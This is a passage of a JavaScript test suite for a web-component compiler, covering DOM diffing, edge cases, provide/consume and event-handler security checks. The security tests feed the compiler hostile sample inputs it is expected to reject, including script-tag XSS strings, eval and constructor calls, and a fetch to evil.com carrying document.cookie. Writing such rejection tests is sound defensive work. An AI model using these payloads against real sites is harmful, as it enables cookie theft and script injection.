  assert.ok(!result.output.includes('eval('), 'generated code should not contain eval()');
});

test('S-10: invalid #if syntax reports diagnostic error', () => {
  const src = `<meta>name: "x-parse-err"</meta>
<script>state x: number = 0</script>
<template>
  <#if badattr>
    <div>test</div>
  </#if>
</template>`;
  const result = compile(src);
  assertFail(result);
  assert.ok(result.diagnostics.some(d => d.code === 'E0004'), 'should report E0004 for parse error');
});

test('S-10: invalid #for syntax reports diagnostic error', () => {
  const src = `<meta>name: "x-for-err"</meta>
<script>state items: string[] = []</script>
<template>
  <#for badattr>
    <div>test</div>
  </#for>
</template>`;
  const result = compile(src);
  assertFail(result);
  assert.ok(result.diagnostics.some(d => d.code === 'E0004'), 'should report E0004 for parse error');
});

// ============================================================
// DIFF-BASED DOM RENDERING TESTS
// ============================================================

test('diff - generated output contains #getNewTree method', () => {
  const src = `<meta>name: "x-diff-a"</meta>
<script>state count: number = 0</script>
<template><p>{{ count }}</p></template>`;
  const result = compile(src);
  assertSuccess(result);
  assert.ok(result.output.includes('#getNewTree()'), 'should contain #getNewTree method');
});

test('diff - generated output contains #patch method', () => {
  const src = `<meta>name: "x-diff-b"</meta>
<script>state count: number = 0</script>
<template><p>{{ count }}</p></template>`;
  const result = compile(src);
  assertSuccess(result);
  assert.ok(result.output.includes('#patch(parent, newContent)'), 'should contain #patch method');
});

test('diff - #update calls #patch instead of #render', () => {
  const src = `<meta>name: "x-diff-c"</meta>
<script>state count: number = 0</script>
<template><p>{{ count }}</p></template>`;
  const result = compile(src);
  assertSuccess(result);
  // #update should call #patch, not #render
  const updateMatch = result.output.match(/#update\(\)\s*\{[\s\S]*?\n  \}/);
  assert.ok(updateMatch, 'should have #update method');
  assert.ok(updateMatch[0].includes('#patch('), '#update should call #patch');
  assert.ok(!updateMatch[0].includes('#render()'), '#update should NOT call #render');
});

test('diff - #patch handles attribute diffing', () => {
  const src = `<meta>name: "x-diff-d"</meta>
<script>state cls: string = "active"</script>
<template><div :class="cls">test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  // Verify #patch has attribute comparison logic
  assert.ok(result.output.includes('o.getAttribute(a.name) !== a.value'), 'should compare attributes');
  assert.ok(result.output.includes('o.setAttribute(a.name, a.value)'), 'should set changed attributes');
  assert.ok(result.output.includes('o.removeAttribute('), 'should remove old attributes');
});

test('diff - #patch handles text node diffing', () => {
  const src = `<meta>name: "x-diff-e"</meta>
<script>state msg: string = "hello"</script>
<template><p>{{ msg }}</p></template>`;
  const result = compile(src);
  assertSuccess(result);
  assert.ok(result.output.includes('o.textContent !== n.textContent'), 'should compare text nodes');
});

test('diff - #patch handles node type mismatch replacement', () => {
  const src = `<meta>name: "x-diff-f"</meta>
<script>state x: number = 0</script>
<template><p>{{ x }}</p></template>`;
  const result = compile(src);
  assertSuccess(result);
  assert.ok(result.output.includes('o.nodeType !== n.nodeType || o.nodeName !== n.nodeName'), 'should detect node type mismatch');
  assert.ok(result.output.includes('parent.replaceChild(n.cloneNode(true), o)'), 'should replace mismatched nodes');
});

test('diff - #patch skips STYLE element children', () => {
  const src = `<meta>name: "x-diff-g"</meta>
<script>state x: number = 0</script>
<template><p>{{ x }}</p></template>
<style>p { color: red; }</style>`;
  const result = compile(src);
  assertSuccess(result);
  assert.ok(result.output.includes("o.tagName === 'STYLE'"), 'should skip STYLE children');
});

test('diff - #patch handles node removal (old > new)', () => {
  const src = `<meta>name: "x-diff-h"</meta>
<script>state items: string[] = ["a"]</script>
<template>
  <#for each="item" of="items"><p>{{ item }}</p></#for>
</template>`;
  const result = compile(src);
  assertSuccess(result);
  assert.ok(result.output.includes('parent.removeChild(o)'), 'should remove extra old nodes');
});

test('diff - #patch handles node addition (new > old)', () => {
  const src = `<meta>name: "x-diff-i"</meta>
<script>state items: string[] = ["a"]</script>
<template>
  <#for each="item" of="items"><p>{{ item }}</p></#for>
</template>`;
  const result = compile(src);
  assertSuccess(result);
  assert.ok(result.output.includes('parent.appendChild(n.cloneNode(true))'), 'should append new nodes');
});

test('diff - #updateKeepFocus delegates to #update (simplified)', () => {
  const src = `<meta>name: "x-diff-j"</meta>
<script>state text: string = ""</script>
<template><input :bind="text" /></template>`;
  const result = compile(src);
  assertSuccess(result);
  // #updateKeepFocus should be simplified - just calls #update
  const keepFocusMatch = result.output.match(/#updateKeepFocus\(focusedEl\)\s*\{[\s\S]*?\n  \}/);
  assert.ok(keepFocusMatch, 'should have #updateKeepFocus method');
  assert.ok(keepFocusMatch[0].includes('this.#update()'), 'should delegate to #update');
  // Should NOT contain old focus-save/restore logic
  assert.ok(!keepFocusMatch[0].includes('selectionStart'), 'should not have manual focus preservation');
});

test('diff - connectedCallback still uses #render for initial render', () => {
  const src = `<meta>name: "x-diff-k"</meta>
<script>state x: number = 0</script>
<template><p>{{ x }}</p></template>`;
  const result = compile(src);
  assertSuccess(result);
  // connectedCallback should use #render (full initial render), not #patch
  const ccMatch = result.output.match(/connectedCallback\(\)\s*\{[\s\S]*?\n  \}/);
  assert.ok(ccMatch, 'should have connectedCallback');
  assert.ok(ccMatch[0].includes('this.#render()'), 'connectedCallback should use #render for initial');
});

test('diff - shadow:none mode uses correct root for patch', () => {
  const src = `<meta>name: "x-diff-l"\nshadow: none</meta>
<script>state x: number = 0</script>
<template><p>{{ x }}</p></template>`;
  const result = compile(src);
  assertSuccess(result);
  // For shadow:none, root is 'this' instead of 'this.#shadow'
  assert.ok(result.output.includes('#patch(this,'), '#patch should use `this` as root for shadow:none');
});

// ============================================================
// TESTS: EDGE CASES & RELIABILITY
// ============================================================

test('edge case - empty string defaults in state', () => {
  const src = `<meta>name: "x-empty-defaults"</meta>
<script>
  state text: string = ""
  state label: string = ""
  state count: number = 0
  state active: boolean = false
</script>
<template>
  <div>{{ text }}</div>
  <div>{{ label }}</div>
  <span>{{ count }}</span>
  <span>{{ active }}</span>
</template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'text\\s*=\\s*""');
  assertContains(result.output, 'count\\s*=\\s*0');
  assertContains(result.output, 'active\\s*=\\s*false');
});

test('edge case - empty string defaults in props', () => {
  const src = `<meta>name: "x-empty-props"</meta>
<script>
  prop title: string = ""
  prop description: string = ""
  prop maxLength: number = 0
</script>
<template>
  <h1>{{ title }}</h1>
  <p>{{ description }}</p>
</template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'observedAttributes');
  assertContains(result.output, "'title'");
  assertContains(result.output, "'description'");
});

test('edge case - XSS nested quotes in interpolation', () => {
  const src = `<meta>name: "x-nested-quotes"</meta>
<script>
  state text: string = "It\\'s \\"quoted\\""
  state html: string = "<script>alert('xss')</script>"
</script>
<template>
  <div>{{ text }}</div>
  <p>{{ html }}</p>
</template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, '#esc\\(');
});

test('edge case - XSS unicode escape sequences in interpolation', () => {
  const src = `<meta>name: "x-unicode"</meta>
<script>
  state emoji: string = "\\u0048\\u0065\\u006c\\u006c\\u006f"
  state rtl: string = "مرحبا"
</script>
<template>
  <div>{{ emoji }}</div>
  <p>{{ rtl }}</p>
</template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, '#esc\\(');
});

test('edge case - special characters in interpolation expressions', () => {
  const src = `<meta>name: "x-special-chars"</meta>
<script>
  state text: string = "hello\\nworld\\ttab"
  state code: string = "backtick code"
  state path: string = "C:\\\\Users\\\\test"
</script>
<template>
  <div>{{ text }}</div>
  <code>{{ code }}</code>
  <span>{{ path }}</span>
</template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('edge case - deep nesting: #if inside #for inside #if', () => {
  const src = `<meta>name: "x-deep-nest"</meta>
<script>
  state outerShow: boolean = true
  state items: string[] = ["a", "b"]
  state innerShow: boolean = true
</script>
<template>
  <#if condition="outerShow">
    <div class="outer">
      <#for each="item" of="items" key="item">
        <#if condition="innerShow">
          <span>{{ item }}</span>
        </#if>
      </#for>
    </div>
  </#if>
</template>`;
  const result = compile(src);
  assertSuccess(result);
  // Verify ternary operators and map are generated
  assertContains(result.output, /\?[^?]*:/);  // Ternary operator
  assertContains(result.output, /\.map\(/);   // Map for loop
});

test('edge case - triple nested #if condition chains', () => {
  const src = `<meta>name: "x-triple-if"</meta>
<script>
  state a: boolean = true
  state b: boolean = false
  state c: boolean = true
</script>
<template>
  <#if condition="a">
    <div>A</div>
    <#if condition="b">
      <div>B</div>
      <#if condition="c">
        <div>C</div>
      </#if>
    </#if>
  </#if>
</template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('edge case - multiple sibling #for loops with same variable names', () => {
  const src = `<meta>name: "x-multi-for"</meta>
<script>
  state list1: string[] = ["a", "b"]
  state list2: string[] = ["x", "y"]
  state list3: string[] = ["1", "2"]
</script>
<template>
  <div>
    <#for each="item" of="list1" key="item">
      <span>{{ item }}</span>
    </#for>
  </div>
  <div>
    <#for each="item" of="list2" key="item">
      <span>{{ item }}</span>
    </#for>
  </div>
  <div>
    <#for each="item" of="list3" key="item">
      <span>{{ item }}</span>
    </#for>
  </div>
</template>`;
  const result = compile(src);
  assertSuccess(result);
  // Should generate three separate map() calls
  const mapCount = (result.output.match(/\.map\(/g) || []).length;
  assert(mapCount >= 3, 'Should have at least 3 map() calls for 3 loops');
});

test('edge case - special characters in prop defaults (quotes, angle brackets)', () => {
  const src = `<meta>name: "x-special-props"</meta>
<script>
  prop title: string = "Title \\"quoted\\""
  prop content: string = "<div>html</div>"
  prop pattern: string = "<[^>]+>"
  prop escape: string = "a\\\\b"
</script>
<template>
  <h1>{{ title }}</h1>
  <div>{{ content }}</div>
</template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('edge case - single quotes in prop defaults', () => {
  const src = `<meta>name: "x-single-quotes"</meta>
<script>
  prop msg: string = "It's working"
  prop pattern: string = "can't stop"
</script>
<template>
  <p>{{ msg }}</p>
  <p>{{ pattern }}</p>
</template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('edge case - large component stress test (many state vars)', () => {
  let stateDecl = '';
  for (let i = 0; i < 50; i++) {
    stateDecl += `  state var${i}: number = ${i}\n`;
  }
  let templateContent = '';
  for (let i = 0; i < 50; i++) {
    templateContent += `  <span>{{ var${i} }}</span>\n`;
  }
  const src = `<meta>name: "x-large-state"</meta>
<script>
${stateDecl}
</script>
<template>
${templateContent}
</template>`;
  const result = compile(src);
  assertSuccess(result);
  for (let i = 0; i < 50; i++) {
    assertContains(result.output, `#var${i}`);
  }
});

test('edge case - large component with many props', () => {
  let propDecl = '';
  for (let i = 0; i < 30; i++) {
    propDecl += `  prop prop${i}: string = "default${i}"\n`;
  }
  const src = `<meta>name: "x-large-props"</meta>
<script>
${propDecl}
</script>
<template>
  <div>Component with many props</div>
</template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'observedAttributes');
  for (let i = 0; i < 30; i++) {
    assertContains(result.output, `'prop${i}'`);
  }
});

test('edge case - event handler modifier combinations (@click|stopPropagation|preventDefault)', () => {
  const src = `<meta>name: "x-modifiers"</meta>
<script>
  fn handleClick() { console.log("clicked") }
  fn handleSubmit() { console.log("submitted") }
  fn handleKey() { console.log("key") }
</script>
<template>
  <button @click|stopPropagation="handleClick">Stop</button>
  <button @click|preventDefault="handleClick">Prevent</button>
  <form @submit|stopPropagation|preventDefault="handleSubmit">
    <input @keydown|enter|shift="handleKey" />
  </form>
</template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'addEventListener');
});

test('edge case - inline expressions with special chars in event handlers', () => {
  const src = `<meta>name: "x-inline-expr"</meta>
<script>
  state count: number = 0
  fn increment() { count += 1 }
  fn add(n: number) { count += n }
</script>
<template>
  <button @click="add(5 + 3)">Add 8</button>
  <button @click="add(-2)">Sub 2</button>
  <button @click="count = count * 2">Double</button>
</template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('edge case - template with only text, no elements', () => {
  const src = `<meta>name: "x-text-only"</meta>
<template>
  Just plain text content here.
  Multiple lines of text.
  No HTML elements at all.
</template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'text');
});

test('edge case - template with text and whitespace, no elements', () => {
  const src = `<meta>name: "x-text-ws"</meta>
<script>state msg: string = "hello"</script>
<template>
Greeting: {{ msg }}

More text here.
</template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('edge case - computed referencing another computed', () => {
  const src = `<meta>name: "x-chained-computed"</meta>
<script>
  state x: number = 5
  computed double: number = x * 2
  computed quad: number = double * 2
  computed hex: number = quad * 2
</script>
<template>
  <span>{{ x }}</span>
  <span>{{ double }}</span>
  <span>{{ quad }}</span>
  <span>{{ hex }}</span>
</template>`;
  const result = compile(src);
  assertSuccess(result);
  // Should have getter definitions for all computed properties
  assertContains(result.output, 'get #double');
  assertContains(result.output, 'get #quad');
  assertContains(result.output, 'get #hex');
});

test('edge case - computed with complex expression', () => {
  const src = `<meta>name: "x-complex-computed"</meta>
<script>
  state a: number = 1
  state b: number = 2
  state c: number = 3
  computed result: number = (a + b) * c - a / 2
</script>
<template>
  <div>{{ result }}</div>
</template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'get #result');
});

test('edge case - watch with multiple dependencies (simulated with separate watches)', () => {
  const src = `<meta>name: "x-multi-watch"</meta>
<script>
  state a: number = 0
  state b: number = 0
  state c: number = 0
  watch(a) { console.log("a changed") }
  watch(b) { console.log("b changed") }
  watch(c) { console.log("c changed") }
</script>
<template>
  <div>{{ a }} {{ b }} {{ c }}</div>
</template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('edge case - watch with nested path referencing', () => {
  const src = `<meta>name: "x-watch-nested"</meta>
<script>
  state count: number = 0
  watch(count) { console.log("count changed") }
</script>
<template>
  <div>{{ count }}</div>
</template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('edge case - shadow:closed mode output differs from open', () => {
  const srcOpen = `<meta>name: "x-shadow-open"</meta>
<template><div>test</div></template>`;
  const srcClosed = `<meta>
  name: "x-shadow-closed"
  shadow: closed
</meta>
<template><div>test</div></template>`;

  const resultOpen = compile(srcOpen);
  const resultClosed = compile(srcClosed);

  assertSuccess(resultOpen);
  assertSuccess(resultClosed);

  // Both should have shadow DOM
  assertContains(resultOpen.output, 'attachShadow');
  assertContains(resultClosed.output, 'attachShadow');

  // Check mode difference
  assertContains(resultOpen.output, "mode: 'open'");
  assertContains(resultClosed.output, "mode: 'closed'");

  // Output should be different
  assert.notStrictEqual(resultOpen.output, resultClosed.output, 'open and closed modes should produce different output');
});

test('edge case - empty template (no content)', () => {
  const src = `<meta>name: "x-empty-tpl"</meta>
<template></template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('edge case - template with only whitespace and comments', () => {
  const src = `<meta>name: "x-whitespace-tpl"</meta>
<template>


</template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('edge case - multiple event handlers on same element', () => {
  const src = `<meta>name: "x-multi-handlers"</meta>
<script>
  fn handleClick() { console.log("click") }
  fn handleEnter() { console.log("enter") }
  fn handleLeave() { console.log("leave") }
  fn handleFocus() { console.log("focus") }
</script>
<template>
  <button @click="handleClick" @mouseenter="handleEnter" @mouseleave="handleLeave" @focus="handleFocus">
    Hover and Click
  </button>
</template>`;
  const result = compile(src);
  assertSuccess(result);
  // Should have multiple addEventListener calls
  const addEventCount = (result.output.match(/addEventListener/g) || []).length;
  assert(addEventCount >= 4, 'Should have at least 4 addEventListener calls');
});

test('edge case - three event handlers on same element', () => {
  const src = `<meta>name: "x-three-handlers"</meta>
<script>
  fn handleA() {}
  fn handleB() {}
  fn handleC() {}
</script>
<template>
  <div @click="handleA" @dblclick="handleB" @keydown="handleC">Multi-handler</div>
</template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('edge case - boolean prop passing with disabled attribute', () => {
  const src = `<meta>name: "x-bool-props"</meta>
<script>
  prop disabled: boolean = false
  prop required: boolean = true
  prop readonly: boolean = false
</script>
<template>
  <input :disabled="disabled" :required="required" :readonly="readonly" />
  <button :disabled="disabled">Submit</button>
</template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'observedAttributes');
});

test('edge case - scoped CSS with media queries', () => {
  const src = `<meta>name: "x-media"
shadow: none</meta>
<script>state theme: string = "light"</script>
<template><div class="container">{{ theme }}</div></template>
<style>
  .container { padding: 10px; }
  @media (max-width: 768px) {
    .container { padding: 5px; }
  }
  @media (prefers-dark-colorscheme) {
    .container { background: black; color: white; }
  }
</style>`;
  const result = compile(src);
  assertSuccess(result);
  // Should have scoped media queries
  assertContains(result.output, 'data-chasket-scope');
  assertContains(result.output, '@media');
});

test('edge case - scoped CSS with pseudo-classes', () => {
  const src = `<meta>name: "x-pseudo"
shadow: none</meta>
<template><button class="btn">Click</button></template>
<style>
  .btn:hover { background: blue; }
  .btn:active { background: darkblue; }
  .btn:focus { outline: 2px solid gold; }
</style>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'data-chasket-scope');
  assertContains(result.output, ':hover');
});

test('edge case - scoped CSS with pseudo-elements', () => {
  const src = `<meta>name: "x-pseudo-elem"
shadow: none</meta>
<template><button class="btn">Click</button></template>
<style>
  .btn::before { content: "→ "; }
  .btn::after { content: " ←"; }
</style>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'data-chasket-scope');
});

test('edge case - very long interpolation expression', () => {
  const src = `<meta>name: "x-long-expr"</meta>
<script>
  state a: number = 1
  state b: number = 2
  state c: number = 3
</script>
<template>
  <div>{{ (a + b + c) * 2 - a / 2 + b * 3 - c + a * b * c }}</div>
</template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('edge case - prop with object default values', () => {
  const src = `<meta>name: "x-complex-obj"</meta>
<script>
  prop title: string = "default"
  prop count: number = 0
  prop enabled: boolean = true
</script>
<template>
  <div>{{ title }} - {{ count }} - {{ enabled }}</div>
</template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('edge case - union type prop with multiple options', () => {
  const src = `<meta>name: "x-union-prop"</meta>
<script>
  prop size: string = "medium"
  prop status: string | number = "idle"
</script>
<template>
  <div>{{ size }} - {{ status }}</div>
</template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('edge case - array type state with elements', () => {
  const src = `<meta>name: "x-complex-array"</meta>
<script>
  state items: string[] = ["a", "b"]
</script>
<template>
  <#for each="item" of="items" key="item">
    <div>{{ item }}</div>
  </#for>
</template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('edge case - method with multiple parameters and complex body', () => {
  const src = `<meta>name: "x-complex-method"</meta>
<script>
  state count: number = 0
  fn update(n: number, mult: number = 1, add: number = 0) {
    count = (count + n) * mult + add
    console.log("updated", count)
  }
</script>
<template>
  <button @click="update(5, 2, 1)">Update</button>
</template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('edge case - emit with complex data type', () => {
  const src = `<meta>name: "x-complex-emit"</meta>
<script>
  emit itemAdded: { id: number, name: string, timestamp: number }
  emit error: { code: string, message: string }
</script>
<template>
  <button @click="itemAdded">Emit</button>
</template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'CustomEvent');
  assertContains(result.output, "'itemAdded'");
  assertContains(result.output, "'error'");
});

test('edge case - interpolation with method calls and chaining', () => {
  const src = `<meta>name: "x-chained-calls"</meta>
<script>
  state text: string = "hello world"
  computed upper: string = text.toUpperCase()
</script>
<template>
  <div>{{ upper }}</div>
</template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('edge case - conditional with complex ternary in template', () => {
  const src = `<meta>name: "x-complex-ternary"</meta>
<script>
  state status: string = "pending"
  state count: number = 0
</script>
<template>
  <div>{{ status === "done" ? "Completed: " + count : status === "error" ? "Error!" : "Processing..." }}</div>
</template>`;
  const result = compile(src);
  assertSuccess(result);
});

// ============================================================
// SECURITY TESTS: S-17 Event Handler Expression Code Injection
// ============================================================

test('security - S-17: reject event handler with eval()', () => {
  const src = `<meta>name: "x-security-eval"</meta>
<script>fn handleClick() {}</script>
<template><button @click="eval('alert(1)')">Click</button></template>`;
  const result = compile(src);
  assertFail(result, 'Should reject eval in event handler');
  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
});

test('security - S-17: reject event handler with Function constructor', () => {
  const src = `<meta>name: "x-security-func"</meta>
<script>fn handleClick() {}</script>
<template><button @click="new Function('alert(1)')">Click</button></template>`;
  const result = compile(src);
  assertFail(result, 'Should reject Function constructor in event handler');
  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
});

test('security - S-17: reject event handler with alert(1)', () => {
  const src = `<meta>name: "x-security-alert"</meta>
<script>fn handleClick() {}</script>
<template><button @click="alert('XSS')">Click</button></template>`;
  const result = compile(src);
  assertFail(result, 'Should reject alert() with string in event handler');
  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
});

test('security - S-17: reject event handler with fetch to external URL', () => {
  const src = `<meta>name: "x-security-fetch"</meta>
<script>fn handleClick() {}</script>
<template><button @click="fetch('https://evil.com')">Click</button></template>`;
  const result = compile(src);
  assertFail(result, 'Should reject fetch with string in event handler');
  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
});

test('security - S-17: reject event handler with multiple statements', () => {
  const src = `<meta>name: "x-security-multi"</meta>
<script>
  state count: number = 0
  fn increment() { count += 1 }
</script>
<template><button @click="increment(); fetch('evil.com')">Click</button></template>`;
  const result = compile(src);
  assertFail(result, 'Should reject multiple statements (semicolon) in event handler');
  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
});

test('security - S-17: reject event handler with destructuring', () => {
  const src = `<meta>name: "x-security-destruct"</meta>
<script>fn handleClick() {}</script>
<template><button @click="[a, b] = data">Click</button></template>`;
  const result = compile(src);
  assertFail(result, 'Should reject destructuring in event handler');
  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
});

test('security - S-17: reject event handler with constructor access', () => {
  const src = `<meta>name: "x-security-constructor"</meta>
<script>fn handleClick() {}</script>
<template><button @click="Object.constructor('alert(1)')">Click</button></template>`;
  const result = compile(src);
  assertFail(result, 'Should reject constructor access in event handler');
  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
});

test('security - S-17: reject event handler with __proto__', () => {
  const src = `<meta>name: "x-security-proto"</meta>
<script>fn handleClick() {}</script>
<template><button @click="__proto__.evil = true">Click</button></template>`;
  const result = compile(src);
  assertFail(result, 'Should reject __proto__ in event handler');
  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
});

test('security - S-17: reject event handler with template literals', () => {
  const src = `<meta>name: "x-security-template-lit"</meta>
<script>fn handleClick() {}</script>
<template><button @click="fetch(\\\`https://evil.com?data=\${document.cookie}\\\`)">Click</button></template>`;
  const result = compile(src);
  assertFail(result, 'Should reject template literals in event handler');
  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
});

test('security - S-17: reject event handler with regex', () => {
  const src = `<meta>name: "x-security-regex"</meta>
<script>fn handleClick() {}</script>
<template><button @click="/(foo|bar)/.test(str)">Click</button></template>`;
  const result = compile(src);
  assertFail(result, 'Should reject regex in event handler');
  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
});

test('security - S-17: reject event handler with comments', () => {
  const src = `<meta>name: "x-security-comment"</meta>
<script>fn handleClick() {}</script>
<template><button @click="increment() // evil code">Click</button></template>`;
  const result = compile(src);
  assertFail(result, 'Should reject comments in event handler');
  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
});

test('security - S-17: allow simple function name in event handler', () => {
  const src = `<meta>name: "x-security-ok-simple"</meta>
<script>
  fn handleClick() { console.log("safe") }
</script>
<template><button @click="handleClick">Click</button></template>`;
  const result = compile(src);
  assertSuccess(result, 'Should allow simple function name');
});

test('security - S-17: allow simple function call in event handler', () => {
  const src = `<meta>name: "x-security-ok-call"</meta>
<script>
  fn handleClick() { console.log("safe") }
</script>
<template><button @click="handleClick()">Click</button></template>`;
  const result = compile(src);
  assertSuccess(result, 'Should allow simple function call');
});

test('security - S-17: allow function call with number argument', () => {
  const src = `<meta>name: "x-security-ok-num-arg"</meta>
<script>
  fn add(n: number) { console.log(n) }
</script>
<template><button @click="add(5)">Click</button></template>`;
  const result = compile(src);
  assertSuccess(result, 'Should allow function call with number argument');
});

test('security - S-17: allow function call with identifier argument', () => {
  const src = `<meta>name: "x-security-ok-id-arg"</meta>
<script>
  state count: number = 0
  fn add(n: number) { count += n }
</script>
<template><button @click="add(count)">Click</button></template>`;
  const result = compile(src);
  assertSuccess(result, 'Should allow function call with identifier argument');
});

test('security - S-17: allow assignment to state in event handler', () => {
  const src = `<meta>name: "x-security-ok-assign"</meta>
<script>
  state count: number = 0
</script>
<template><button @click="count = count + 1">Click</button></template>`;
  const result = compile(src);
  assertSuccess(result, 'Should allow assignment to state');
});

test('security - S-17: allow function call with expression argument', () => {
  const src = `<meta>name: "x-security-ok-expr-arg"</meta>
<script>
  state x: number = 5
  fn multiply(n: number) { console.log(n) }
</script>
<template><button @click="multiply(x * 2)">Click</button></template>`;
  const result = compile(src);
  assertSuccess(result, 'Should allow function call with expression argument');
});

test('security - S-17: reject event handler with spread operator', () => {
  const src = `<meta>name: "x-security-spread"</meta>
<script>
  fn handler(...args) {}
</script>
<template><button @click="handler(...data)">Click</button></template>`;
  const result = compile(src);
  assertFail(result, 'Should reject spread operator in event handler');
  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
});

test('security - S-17: reject empty event handler', () => {
  const src = `<meta>name: "x-security-empty"</meta>
<script>fn noop() {}</script>
<template><button @click="">Click</button></template>`;
  const result = compile(src);
  assertFail(result, 'Should reject empty event handler');
  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
});

// ============================================================
// TESTS: PROVIDE/CONSUME FEATURE (Integration Tests)
// ============================================================

test('provide/consume - basic provide declaration generates correct code', () => {
  const src = `<meta>name: "x-provider"</meta>
<script>
  provide themeColor: string = "blue"
</script>
<template><div>{{ themeColor }}</div></template>`;
  const result = compile(src);
  assertSuccess(result, 'Basic provide should compile successfully');
  assertContains(result.output, '#themeColor', 'Should have private field for provide');
  assertContains(result.output, '__chasket_ctx_themeColor', 'Should have context event name for themeColor');
  assertContains(result.output, `addEventListener.*__chasket_ctx_themeColor`, 'Should add event listener for provide in connectedCallback');
});

test('provide/consume - basic consume declaration generates correct code', () => {
  const src = `<meta>name: "x-consumer"</meta>
<script>
  consume themeColor: string
</script>
<template><div>{{ themeColor }}</div></template>`;
  const result = compile(src);
  assertSuccess(result, 'Basic consume should compile successfully');
  assertContains(result.output, '#themeColor', 'Should have private field for consume');
  assertContains(result.output, '__chasket_ctx_themeColor', 'Should have context event name for themeColor');
  assertContains(result.output, `dispatchEvent.*__chasket_ctx_themeColor`, 'Should dispatch event to find provider in connectedCallback');
  assertContains(result.output, `CustomEvent`, 'Should use CustomEvent for context propagation');
});

test('provide/consume - provide with initial value generates correct initialization', () => {
  const src = `<meta>name: "x-provider-init"</meta>
<script>
  provide userData: object = {}
</script>
<template><div>{{ userData }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, `#userData.*=.*{}`, 'Should initialize provide with object literal');
});

test('provide/consume - consume references correct provide context via event name', () => {
  const src = `<meta>name: "x-ctx-match"</meta>
<script>
  consume currentUser: object
</script>
<template><div>Context bound</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  // Should dispatch event with the correct context name
  assertContains(result.output, `__chasket_ctx_currentUser`, 'Should use correct context name in event');
  assertContains(result.output, `new CustomEvent.*__chasket_ctx_currentUser`, 'Should create CustomEvent with correct context name');
  assertContains(result.output, `detail.*value.*provider`, 'Should have detail object with value and provider fields');
});

test('provide/consume - multiple provide declarations', () => {
  const src = `<meta>name: "x-multi-provide"</meta>
<script>
  provide themeColor: string = "blue"
  provide appTitle: string = "My App"
  provide version: number = 1
</script>
<template><div>{{ themeColor }} - {{ appTitle }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, `__chasket_ctx_themeColor`, 'Should have listener for themeColor');
  assertContains(result.output, `__chasket_ctx_appTitle`, 'Should have listener for appTitle');
  assertContains(result.output, `__chasket_ctx_version`, 'Should have listener for version');
});

test('provide/consume - multiple consume declarations', () => {
  const src = `<meta>name: "x-multi-consume"</meta>
<script>
  consume themeColor: string
  consume appTitle: string
  consume user: object
</script>
<template><div>{{ themeColor }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, `__chasket_ctx_themeColor`, 'Should dispatch event for themeColor');
  assertContains(result.output, `__chasket_ctx_appTitle`, 'Should dispatch event for appTitle');
  assertContains(result.output, `__chasket_ctx_user`, 'Should dispatch event for user');
  // Verify multiple event dispatches
  const dispatchCount = (result.output.match(/dispatchEvent/g) || []).length;
  assert(dispatchCount >= 3, 'Should dispatch at least 3 events for 3 consume declarations');
});

test('provide/consume - provide and consume in same component', () => {
  const src = `<meta>name: "x-both"</meta>
<script>
  provide theme: string = "dark"
  consume parentTheme: string
</script>
<template><div>{{ theme }}/{{ parentTheme }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  // Should have both event listener for provide and event dispatch for consume
  assertContains(result.output, `addEventListener.*__chasket_ctx_theme`, 'Should listen for theme provides');
  assertContains(result.output, `dispatchEvent.*__chasket_ctx_parentTheme`, 'Should dispatch for parentTheme consumer');
});

test('provide/consume - provide type matches consumed type (string)', () => {
